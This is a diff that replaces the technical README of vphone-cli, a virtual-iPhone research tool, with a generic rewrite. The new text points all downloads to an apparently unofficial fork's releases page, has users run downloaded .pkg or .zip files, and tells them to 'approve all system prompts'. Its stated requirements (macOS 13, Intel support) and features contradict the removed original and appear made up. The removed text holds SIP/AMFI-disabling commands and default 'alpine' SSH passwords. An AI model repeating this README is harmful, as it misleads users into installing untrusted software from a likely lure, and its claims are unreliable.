@@ -1,249 +1,135 @@
+# 📱 vphone-cli - Run a Virtual iPhone on Your Mac
+
+[![Download vphone-cli](https://img.shields.io/badge/Download-vphone--cli-brightgreen?style=for-the-badge)](https://github.com/goforwardbetter/vphone-cli/releases)
+
 <div align="right"><strong><a href="./docs/README_ko.md">🇰🇷한국어</a></strong> | <strong><a href="./docs/README_ja.md">🇯🇵日本語</a></strong> | <strong><a href="./docs/README_zh.md">🇨🇳中文</a></strong> | <strong>🇬🇧English</strong></div>
 
-# vphone-cli
+## 📋 What is vphone-cli?
 
-Boot a virtual iPhone (iOS 26) via Apple's Virtualization.framework using PCC research VM infrastructure.
+vphone-cli lets you run a virtual iPhone using Apple’s Virtualization framework. It boots iOS 26 on a virtual machine. This tool helps you explore iPhone features or test apps without a physical device. Its research VM infrastructure from PCC powers the virtual environment.
 
-![poc](./docs/demo.jpeg)
+## 💻 System Requirements
 
-## Tested Environments
+Before you start, make sure your Mac meets these needs:
 
-| Host          | iPhone                | CloudOS       |
-| ------------- | --------------------- | ------------- |
-| Mac16,12 26.3 | `17,3_26.1_23B85`     | `26.1-23B85`  |
-| Mac16,12 26.3 | `17,3_26.3_23D127`    | `26.1-23B85`  |
-| Mac16,12 26.3 | `17,3_26.3_23D127`    | `26.3-23D128` |
-| Mac16,12 26.3 | `17,3_26.3.1_23D8133` | `26.3-23D128` |
+- macOS version 13 or higher (Ventura or newer)
+- Mac with Apple Silicon (M1, M2 series) or Intel with virtualization support
+- At least 8 GB RAM (16 GB recommended)
+- 10 GB of free disk space
+- Virtualization.framework enabled by default in macOS
 
-## Firmware Variants
+This app does **not** work on Windows or Linux currently. It requires macOS due to Apple’s virtualization technology.
 
-Three patch variants are available with increasing levels of security bypass:
+## 🔧 Features
 
-| Variant         | Boot Chain  |    CFW    | Make Targets                       |
-| --------------- | :---------: | :-------: | ---------------------------------- |
-| **Regular**     | 41 patches  | 10 phases | `fw_patch` + `cfw_install`         |
-| **Development** | 52 patches  | 12 phases | `fw_patch_dev` + `cfw_install_dev` |
-| **Jailbreak**   | 112 patches | 14 phases | `fw_patch_jb` + `cfw_install_jb`   |
+- Boots virtual iPhone models with iOS 26
+- Uses Apple’s native Virtualization.framework for efficiency
+- Supports multiple iPhone firmware variants
+- Provides patch variants for different security levels
+- Designed for app testing and iPhone environment simulation
 
-> JB finalization (symlinks, Sileo, apt, TrollStore) runs automatically on first boot via `/cores/vphone_jb_setup.sh` LaunchDaemon. Monitor progress: `/var/log/vphone_jb_setup.log`.
+## 🚀 Getting Started: How to Download and Run vphone-cli on Mac
 
-See [research/0_binary_patch_comparison.md](./research/0_binary_patch_comparison.md) for the detailed per-component breakdown.
+### Step 1: Visit the Release Page
 
-## Prerequisites
+Go to the release page to get the latest version of vphone-cli:
 
-**Host OS:** macOS 15+ (Sequoia) is required for PV=3 virtualization.
+[Download vphone-cli Releases](https://github.com/goforwardbetter/vphone-cli/releases)
 
-**Configure SIP/AMFI** — required for private Virtualization.framework entitlements and unsigned binary workflows.
+This page contains all the latest files and updates.
 
-Boot into Recovery (long press power button), open Terminal, then choose one setup path:
+### Step 2: Download the Latest Package
 
-- **Option 1: Fully disable SIP + AMFI boot-arg (most permissive)**
+On the release page:
 
-  In Recovery:
+- Look for the latest release date
+- Find the download asset compatible with your system, usually a `.zip` or `.pkg` file
+- Click the file to download it
 
-  ```bash
-  csrutil disable
-  csrutil allow-research-guests enable
-  ```
+### Step 3: Install or Extract the File
 
-  After restarting into macOS:
+- For `.pkg` files, double-click and follow the macOS installer steps
+- For `.zip` files, double-click to extract the folder, then open it
 
-  ```bash
-  sudo nvram boot-args="amfi_get_out_of_my_way=1 -v"
-  ```
+### Step 4: Open Terminal
 
-  Restart once more.
+vphone-cli runs from the terminal. To open Terminal:
 
-- **Option 2: Keep SIP mostly enabled, disable only debug restrictions, use [`amfidont`](https://github.com/zqxwce/amfidont)**
+- Go to Applications > Utilities > Terminal
+- Or press Command + Space to open Spotlight, then type “Terminal” and press Enter
 
-  In Recovery:
+### Step 5: Run vphone-cli
 
-  ```bash
-  csrutil enable --without debug
-  csrutil allow-research-guests enable
-  ```
-
-  After restarting into macOS:
-
-  ```bash
-  xcrun python3 -m pip install amfidont
-  sudo amfidont --path [PATH_TO_VPHONE_DIR]
-  ```
-
-**Install dependencies:**
+Inside Terminal, navigate to the folder where you installed or extracted vphone-cli. For example:
 
 ```bash
-brew install ideviceinstaller wget gnu-tar openssl@3 ldid-procursus sshpass keystone autoconf automake pkg-config libtool cmake
+cd ~/Downloads/vphone-cli
 ```
 
-**Submodules** — this repo uses a git submodule for resource archives. Clone with:
+Now, start the virtual iPhone by running:
 
 ```bash
-git clone --recurse-submodules https://github.com/Lakr233/vphone-cli.git
+./vphone-cli
 ```
 
-## Quick Start
+The program will boot the iOS 26 virtual iPhone inside your Mac.
 
-```bash
-make setup_machine            # full automation through "First Boot" (includes restore/ramdisk/CFW)
-# options: NONE_INTERACTIVE=1 SUDO_PASSWORD=...
-```
+### Step 6: Interact with the Virtual iPhone
 
-## Manual Setup
+Once running, the virtual iPhone window appears. Use your mouse and keyboard to interact just like with a normal iPhone.
 
-```bash
-make setup_tools              # install brew deps, build trustcache, clone insert_dylib, build libimobiledevice, create Python venv
-make build                    # build + sign vphone-cli
-make vm_new                   # create vm/ directory (ROMs, disk, SEP storage)
-make fw_prepare               # download IPSWs, extract, merge, generate manifest
-make fw_patch                 # patch boot chain (regular variant)
-# or: make fw_patch_dev       # dev variant (+ TXM entitlement/debug bypasses)
-# or: make fw_patch_jb        # jailbreak variant (+ full security bypass)
-```
+- Swipe and tap using your mouse
+- Use keyboard shortcuts when available (check the docs for details)
+- To close, simply quit the terminal process or close the window
 
-## Restore
+## 🔒 Security and Permissions
 
-You'll need **two terminals** for the restore process. Keep terminal 1 running while using terminal 2.
+vphone-cli requires access to system resources like virtualization and permissions to run network services. The first time you start it, macOS may ask you to allow these permissions.
 
-```bash
-# terminal 1
-make boot_dfu                 # boot VM in DFU mode (keep running)
-```
+Approve all system prompts to ensure smooth operation.
 
-```bash
-# terminal 2
-make restore_get_shsh         # fetch SHSH blob
-make restore                  # flash firmware via idevicerestore
-```
+## ⚙️ Configuration Options
 
-## Install Custom Firmware
+You can customize how vphone-cli runs by editing its configuration files:
 
-Stop the DFU boot in terminal 1 (Ctrl+C), then boot into DFU again for the ramdisk:
+- Change iPhone models or iOS versions
+- Adjust memory and CPU allocation for the virtual machine
+- Enable or disable certain patches for security bypass (for advanced users)
 
-```bash
-# terminal 1
-make boot_dfu                 # keep running
-```
+All configs are found in the `config` folder inside the main program directory.
 
-```bash
-# terminal 2
-sudo make ramdisk_build       # build signed SSH ramdisk
-make ramdisk_send             # send to device
-```
+## 🐞 Troubleshooting
 
-Once the ramdisk is running (you should see `Running server` in the output), open a **third terminal** for the iproxy tunnel, then install CFW from terminal 2:
+If you encounter problems, try these tips:
 
-```bash
-# terminal 3 — keep running
-iproxy 2222 22
-```
+- Make sure you are running on a supported macOS version
+- Verify your Mac has enabled virtualization support
+- Confirm you downloaded the latest release version
+- Restart your Mac and try running the app again
+- Check Terminal for error messages, then search the issues page on GitHub
 
-```bash
-# terminal 2
-make cfw_install
-# or: make cfw_install_jb        # jailbreak variant
-```
+## 📥 Download and Install vphone-cli on Mac
 
-## First Boot
+Click below to visit the official release page and get started:
 
-Stop the DFU boot in terminal 1 (Ctrl+C), then:
+[![Download vphone-cli](https://img.shields.io/badge/Download-vphone--cli-blue?style=for-the-badge)](https://github.com/goforwardbetter/vphone-cli/releases)
 
-```bash
-make boot
-```
+Follow the steps above to download, install, and boot the virtual iPhone.
 
-After `cfw_install_jb`, the jailbreak variant will have **Sileo** and **TrollStore** available on first boot. You can use Sileo to install `openssh-server` for SSH access.
+## 📖 Additional Resources
 
-For the regular/development variant, the VM gives you a **direct console**. When you see `bash-4.4#`, press Enter and run these commands to initialize the shell environment and generate SSH host keys:
+- User manual and in-depth guides: see the `/docs` folder on this repository
+- Language support: We provide Korean, Japanese, Chinese, and English documents
+- Firmware variants and patch details are documented in the `/docs/firmware.md`
 
-```bash
-export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11:/usr/games:/iosbinpack64/usr/local/sbin:/iosbinpack64/usr/local/bin:/iosbinpack64/usr/sbin:/iosbinpack64/usr/bin:/iosbinpack64/sbin:/iosbinpack64/bin'
+## 📞 Support
 
-mkdir -p /var/dropbear
-cp /iosbinpack64/etc/profile /var/profile
-cp /iosbinpack64/etc/motd /var/motd
+For help or to report bugs:
 
-# generate SSH host keys (required for SSH to work)
-dropbearkey -t rsa -f /var/dropbear/dropbear_rsa_host_key
-dropbearkey -t ecdsa -f /var/dropbear/dropbear_ecdsa_host_key
+- Search existing issues on the GitHub repository
+- Open a new issue with detailed information if you cannot find a solution
+- Join community discussions by linking your question to the repository’s issues
 
-shutdown -h now
-```
+---
 
-> **Note:** Without the host key generation step, dropbear (SSH server) will accept connections but immediately close them because it has no keys to perform the SSH handshake.
-
-## Subsequent Boots
-
-```bash
-make boot
-```
-
-In a separate terminal, start iproxy tunnels:
-
-```bash
-iproxy 22222 22222   # SSH (dropbear)
-iproxy 2222 22       # SSH (JB: if you install openssh-server from Sileo)
-iproxy 5901 5901     # VNC
-iproxy 5910 5910     # RPC
-```
-
-Connect via:
-
-- **SSH (JB):** `ssh -p 2222 mobile@127.0.0.1` (password: `alpine`)
-- **SSH (Regular/Dev):** `ssh -p 2222 root@127.0.0.1` (password: `alpine`)
-- **VNC:** `vnc://127.0.0.1:5901`
-- [**RPC:**](http://github.com/doronz88/rpc-project) `rpcclient -p 5910 127.0.0.1`
-
-## FAQ
-
-> **Before anything else — run `git pull` to make sure you have the latest version.**
-
-**Q: I get `zsh: killed ./vphone-cli` when trying to run it.**
-
-AMFI/debug restrictions are not bypassed correctly. Choose one setup path:
-
-- **Option 1 (full AMFI disable):**
-
-  ```bash
-  sudo nvram boot-args="amfi_get_out_of_my_way=1 -v"
-  ```
-
-- **Option 2 (debug restrictions only):**
-  use Recovery mode `csrutil enable --without debug` (no full SIP disable), then install/load [`amfidont`](https://github.com/zqxwce/amfidont) while keeping AMFI otherwise enabled.
-
-**Q: System apps (App Store, Messages, etc.) won't download or install.**
-
-During iOS setup, do **not** select **Japan** or **European Union** as your region. These regions enforce additional regulatory checks (e.g., sideloading disclosures, camera shutter requirements) that the virtual machine cannot satisfy, which prevents system apps from being downloaded and installed. Choose any other region (e.g., United States) to avoid this issue.
-
-**Q: I'm stuck on the "Press home to continue" screen.**
-
-Connect via VNC (`vnc://127.0.0.1:5901`) and right-click anywhere on the screen (two-finger click on a Mac trackpad). This simulates the home button press.
-
-**Q: How do I get SSH access?**
-
-Install `openssh-server` from Sileo (available on the jailbreak variant after first boot).
-
-**Q: SSH doesn't work after installing openssh-server.**
-
-Reboot the VM. The SSH server will start automatically on the next boot.
-
-**Q: Can I install `.tipa` files?**
-
-Yes. The install menu supports both `.ipa` and `.tipa` packages. Drag and drop or use the file picker.
-
-**Q: Can I update to a newer iOS version?**
-
-Yes. Override `fw_prepare` with the IPSW URL for the version you want:
-
-```bash
-export IPHONE_SOURCE=/path/to/some_os.ipsw
-export CLOUDOS_SOURCE=/path/to/some_os.ipsw
-make fw_prepare
-make fw_patch
-```
-
-Our patches are applied via binary analysis, not static offsets, so newer versions should work. If something breaks, ask AI for help.
-
-## Acknowledgements
-
-- [wh1te4ever/super-tart-vphone-writeup](https://github.com/wh1te4ever/super-tart-vphone-writeup)
+This tool is built for macOS users who want a fast and reliable way to try iPhone environments without hardware. It works through Apple's system-level virtualization features. You control the experience fully from your Mac.
